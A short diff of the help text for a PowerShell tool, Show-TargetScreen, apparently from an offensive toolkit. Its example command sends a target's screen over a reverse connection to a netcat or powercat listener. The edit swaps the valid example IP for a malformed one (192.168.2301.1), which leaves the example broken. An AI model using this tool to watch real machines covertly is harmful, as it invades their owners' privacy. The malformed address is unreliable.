@@ -21,7 +21,7 @@ The IP address to connect to when using the -Reverse switch.
 The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
 
 .EXAMPLE
-PS > Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443
+PS > Show-TargetScreen -Reverse -IPAddress 192.168.2301.1 -Port 443
 
 Above shows an example of aa reverse connection. A netcat/powercat listener must be listening on 
 the given IP and port. 
